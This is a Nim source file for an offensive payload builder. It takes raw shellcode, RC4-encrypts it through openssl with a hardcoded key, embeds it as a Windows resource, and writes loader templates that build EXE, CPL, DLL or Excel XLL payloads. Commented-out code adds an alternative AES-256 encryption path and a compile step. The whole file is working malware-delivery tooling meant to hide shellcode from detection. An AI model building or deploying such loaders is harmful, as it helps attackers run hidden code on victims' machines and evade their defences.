import strutils
import sequtils
import strformat
import os
import osproc
import nimcrypto
import random
import includes/rc4
import std/terminal

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

let 
    args = commandLineParams()
    pCount = paramCount()

var 
    shellcodeFilePath: string
    fileType: string
    architecture: string
    verbosity: string
    file: string
    templatePath: string
    shellcode: string
    scArray: seq[byte]
    aesPasswd: string
    shaKey: MDigest[256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    encSC: seq[byte]
    testVar: string = " @[byte "



if pCount < 2:
    echo fmt"Usage: {paramStr(0)} <rawShellcodeFile> <fileType> <architecture> <verbose>"
    echo "\nArguments <architecture> for file types other than XLL and <verbose> are optional"
    quit(1)
else: 
    shellcodeFilePath = args[0]
    fileType = args[1]

    if pCount > 2:
        architecture = args[2] #only for xll payloads

    if pCount > 3:
        verbosity = args[3]

let
    compileExe: string = r"nim c -d:mingw --opt:none --app=gui --cpu=amd64 -d:strip -d:release -o=simpleexe.exe temp_simpleexe.nim"
    compileCpl: string = r"nim c -d:mingw --mm:arc -d:useMalloc --opt:none --app=lib --nomain --cpu=amd64 -d:strip -d:release -o=simplecpl.cpl temp_simplecpl.nim"
    compileDll: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=amd64 -d:strip -d:release -o=simpledll.dll temp_simpledll.nim"
    compileXll64: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=amd64 -d:strip -d:release -o=simplexll.xll temp_simplexll.nim"
    compileXll32: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=i386 -d:strip -d:release -o=simplexll.xll temp_simplexll.nim"


var xxdKey: string = execCmdEx("echo -n 'testKeytestKeyte' | xxd -p").output
xxdKey.stripLineEnd
let opensslCmd: string = "/usr/bin/openssl enc -rc4 -in $1 -K $2 -nosalt -out encContent.bin" % [shellcodeFilePath, xxdKey]
    
proc aesEncrypt(): void = 
    
    ## Nim's way API using openArray[byte].

    var ectx: CTR[aes256]

    scArray = shellcode.toByteSeq

    encSC = newSeq[byte](len(scArray))

    randomize()
    const asciiRange = 32..126
    aesPasswd = 32.newSeqWith(asciiRange.rand.char).join
    var expandedKey = sha256.digest(aesPasswd)
    #shaKey = expandedKey
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

    discard randomBytes(addr iv[0], 16)

    # Initialization of CBC[aes256] context with encryption key
    ectx.init(key, iv)
    # Encryption process
    ectx.encrypt(scArray, encSC)
    # Clear context of CBC[aes256]
    ectx.clear()

    # Test writing encrypted bytes to file
    writeFile("encContent.bin", encSC)

proc rc4Encrypt(): void =
    # RC4 Encrypt shellcode to file
    echo "[Status] Encrypting shellcode with RC4!"
    
    #var rc4Shellcode = toRC4("testKey", shellcode)
    #scArray = rc4Shellcode.toByteSeq
    #encSC = newSeq[byte](len(scArray))
    #encSC = utils.fromHex(rc4Shellcode)

    echo "[Status] Writing encrypted shellcode to file!"
    try:
        #writeFile("encContent.bin", encSC)
        #Alternate for encrypting shellcode
        echo opensslCmd
        let opensslResult = execCmdEx(opensslCmd)
        if opensslResult.exitCode == 0:
            stdout.styledWriteLine(fgGreen, "[Success] Encrypted shellcode file created!")
            echo xxdKey
            echo opensslResult.output
        else:
            stdout.styledWriteLine(fgRed, "[Failure] Could not create encrypted shellcode file!")
            echo opensslResult.output
            quit(1)
        #echo "[Success] Encrypted shellcode file created!"
    except IOError:
        stdout.styledWriteLine(fgRed, "[Failure] Could not create file!")
        #echo "[Failure] Could not create file!"
        quit(1)
    except:
        stdout.styledWriteLine(fgRed, "[Failure] File could not be created!")
        quit(1)

    # Create resource file
    try:
        writeFile("resource.rc", "100 RCDATA \"encContent.bin\"")
        stdout.styledWriteLine(fgGreen, "[Success] Resource file created!")
        #echo "[Success] Resource file created!"
    except IOError:
        stdout.styledWriteLine(fgRed, "[Failure] Could not create resource file!")
        #echo "[Failure] Could not create resource file!"
        quit(1)

    # Compile resource file
    let rcCompileResults = execCmdEx("/usr/bin/x86_64-w64-mingw32-windres resource.rc -o resource.o")
    if rcCompileResults.exitCode == 0:
        stdout.styledWriteLine(fgGreen, "[Success] Resource file compiled into object file!")
        #removeFile("resource.rc")
        #echo "[Success] Resource file compiled into object!"
    else:
        stdout.styledWriteLine(fgRed, "[Failure] Could not compile resource file!")
        #echo "[Failure] Could not compile resource file!"
        echo rcCompileResults.output
        quit(1)

proc generatePayload(): void =
    var 
        templateFile: string
        tempFile: string
        compileCmd: string
    # Read raw shellcode file
    try:
        echo "[Status] Parsing shellcode file!"
        shellcode = readFile(shellcodeFilePath)
        #echo "shellcode = ", toHex(shellcode)
    except IOError:
        stdout.styledWriteLine(fgRed, "[Failure] Could not open shellcode file!")
        quit(1)
    echo "[Status] Generating Payload! Be patient."
    # Encode/Encrypt bytes
    #aesencrypt()
    rc4Encrypt()

    # Add base64 shellcode to template
    case fileType:
        of "exe":
            templatePath = "templates/simpleexe.nim"
            templateFile = templatePath.readFile()
            tempFile = "temp_simpleexe.nim"
            compileCmd = compileExe
        of "cpl":
            templatePath = "templates/simpledll.nim"
            templateFile = templatePath.readFile()
            tempFile = "temp_simplecpl.nim"
            compileCmd = compileCpl
        of "dll":
            templatePath = "templates/simpledll.nim"
            templateFile = templatePath.readFile()
            tempFile = "temp_simpledll.nim"
            compileCmd = compileDll
        of "xll":
            templatePath = "templates/simplexll.nim"
            templateFile = templatePath.readFile()
            tempFile = "temp_simplexll.nim"
            if architecture == "x64":
                compileCmd = compileXll64
            else:
                compileCmd = compileXll32
        else:
            echo "Error: filetype argument must be dll, xll, or cpl!"
            quit(1)

# Write encrypted shellcode to template as string
#[
    let placeholder = "REPLACE_ME"
    for x in encSC.items:
        testVar.add("0x" & (toHex(x)) & ", ")
    testVar.removeSuffix(", ")
    testVar.add("]")
    
    let replacement = testVar
    try:
        echo "[Status] Encrypting shellcode using AES-256 CTR!"
        templateFile = templateFile.replace(placeholder, replacement)
        tempFile.writeFile(templateFile)
    except:
        echo "[Failure] Cannot add encrypted shellcode to template file!"
        quit(1)
    let origPass = "BLANK_PASSWORD"
    try:
        echo "[Status] Adding AES key to template file!"
        templateFile = templateFile.replace(origPass, aesPasswd)
        tempFile.writeFile(templateFile)
    except:
        echo "[Failure] Cannot add AES key to template file!"
        quit(1)
    let origIV = "BLANK_IV"
    try:
        echo "[Status] Adding AES IV to template file!"
        templateFile = templateFile.replace(origIV, toHex(iv))
        tempFile.writeFile(templateFile)
    except:
        echo "[Failure] Cannot add AES IV to template file!"
        quit(1)
    ]#
    #[
        echo "[Status] Compiling!\n"
    let compileResults = execCmdEx(compileCmd)
    #tempFile.removeFile
    if verbosity == "verbose":
       echo compileResults.output
    ]#

    echo "[Status] Creating loader file!"
    try:
        tempFile.writeFile(templateFile)
        stdout.styledWriteLine(fgGreen, "[Success] Loader file created!")
    except IOError:
        stdout.styledWriteLine(fgRed, "[Failure] Could not create loader file!")

when isMainModule:
    if pCount >= 2:
        generatePayload()
    else:
        echo fmt"Usage: {getAppFileName()} <rawShellcodeFile> <fileType> <architecture> <verbose>"
        quit(1)
